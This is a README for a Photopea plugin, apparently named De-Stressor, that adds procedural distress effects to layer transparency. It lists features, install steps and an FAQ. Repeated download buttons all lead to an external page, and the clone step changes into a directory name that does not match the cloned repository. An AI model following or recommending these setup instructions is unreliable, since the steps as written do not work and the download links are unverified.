# De-Stressor - Photopea Plugin 2026

> **De-Stressor is a Photopea plugin for applying configurable procedural distress effects to layer transparency, with non-destructive controls and full-resolution processing.**

[![Platform](https://img.shields.io/badge/Platform-Photopea-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Current-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/adrianschmidt1969/photopea-destressor-fx?style=flat-square)](https://github.com/adrianschmidt1969/photopea-destressor-fx)

---

<p align="center">
  <a href="https://adrianschmidt1969.github.io/photopea-destressor-fx/">
    <img src="https://img.shields.io/badge/Download-De--Stressor%20Latest-brightgreen?style=for-the-badge" alt="Download De-Stressor">
  </a>
</p>

> **[Direct Download - De-Stressor](https://adrianschmidt1969.github.io/photopea-destressor-fx/)**

---

[Download Latest Build](https://adrianschmidt1969.github.io/photopea-destressor-fx/)

---

## What De-Stressor Does

If you need worn, weathered, or eroded looks inside Photopea, De-Stressor gives you procedural distress tools that act on the active layer’s transparency. Edge wear and similar treatments stay inside the Photopea session instead of forcing a round-trip through another app.

You get a wide style set plus knobs that shape the outcome: live previews, parameter sliders, presets you can reuse, and layer options so you can try variants without rebuilding the effect each time.

---

## Feature Highlights

- Fourteen procedural distress styles to pick from
- Live 64x64 thumbnails so you can scan styles quickly
- Controls for scale, amount, contrast, edge softness, and rotation
- Optional invert on the distress mask for the opposite alpha treatment
- Seed randomization when you want a fresh texture layout
- Copy/paste of effect settings across layers
- Presets saved with `localStorage` so they stick around locally
- Option to replace the source layer or hide it while processing
- Alpha handled at the document’s full resolution
- Transparency edits that fit non-destructive layer habits

---

## Getting It Installed

1. Grab the current De-Stressor package from the [download page](https://adrianschmidt1969.github.io/photopea-destressor-fx/).
2. Start Photopea.
3. Add the plugin the way Photopea expects plugins to be loaded.
4. Activate a layer that has transparency or visible content.
5. Open De-Stressor and start from a style thumbnail that fits the look you want.

For local work or development, clone the repo:

```bash
git clone https://github.com/adrianschmidt1969/photopea-destressor-fx.git
cd de-stressor-photopea-plugin
```

Load it through Photopea’s dev or local-plugin path, then make sure a layer is selected before you run the effect.

---

## Typical Workflow

One practical path through the UI:

1. Open your file in Photopea.
2. Select the layer that should receive the distress treatment.
3. Pick a procedural style in the preview strip.
4. Dial in scale, amount, contrast, edge softness, and rotation.
5. Turn on **Invert** if you need the transparency treatment flipped.
6. Hit seed randomize to sample other procedural layouts.
7. Paste copied settings onto another layer, or store the setup as a preset.
8. Decide whether the original layer is replaced or only hidden.
9. Apply so alpha is processed at full document resolution.

---

## Controls and Settings

There is no separate project config file; everything lives in the plugin UI. You can adjust:

- Distress style
- Scale
- Amount
- Contrast
- Edge softness
- Rotation
- Invert on/off
- Randomized distress seed
- Whether the original layer stays visible, is hidden, or is replaced

Presets are written to the browser’s `localStorage`, so the same browser profile can reload them in later sessions.

---

## Requirements

- Photopea
- An open document with an active layer
- A browser that can run Photopea plugins
- Enough memory for full-resolution alpha work
- JavaScript enabled for the HTML plugin shell

---

## FAQ

### Will De-Stressor run without Photopea?

No. It targets Photopea’s plugin host and is not packaged as a standalone editor.

### Can one setup cover several layers?

Yes via copy and paste of settings. Select each target layer, paste the configuration, then process that layer.

### Where do presets live?

In browser `localStorage` for the environment you are using. Another browser or a cleared profile will not see those presets.

### How do I get a noticeably different distress pattern?

Change style parameters and/or randomize the seed. New seeds reshuffle the procedural layout while keeping the same general parameter set.

### Nothing shows up after I apply—what should I verify?

Confirm the correct layer is active, check replace/hide behavior for the original layer, and recheck amount, contrast, and invert.

### How do I pick up new versions?

Watch the repository and pull from the [latest build download](https://adrianschmidt1969.github.io/photopea-destressor-fx/).

### How should bugs be filed?

Open an issue on the [GitHub repository](https://github.com/adrianschmidt1969/photopea-destressor-fx). Include Photopea context, the settings you used, and steps that reproduce the problem.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
